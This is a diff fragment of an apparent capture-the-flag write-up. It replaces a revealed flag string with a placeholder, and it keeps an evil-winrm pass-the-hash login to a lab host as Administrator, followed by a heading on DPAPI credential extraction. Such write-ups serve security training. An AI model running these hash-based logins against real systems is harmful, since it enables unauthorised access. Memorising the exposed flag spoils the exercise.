@@ -293,7 +293,7 @@ SMB  10.1.157.240  445  NORTHJMP01  [+] NORTHJMP01\Administrator (admin)
 evil-winrm -i 10.1.157.240 -u Administrator -H 4366ec0f86e29be2a4a5e87a1ba922ec
 ```
 
-**User Flag:** `FLAG{ONe_waY_TiCk3T_To_4Dm1N}`
+**User Flag Retrieved!**
 
 ## 4.3 DPAPI Credential Extraction
 
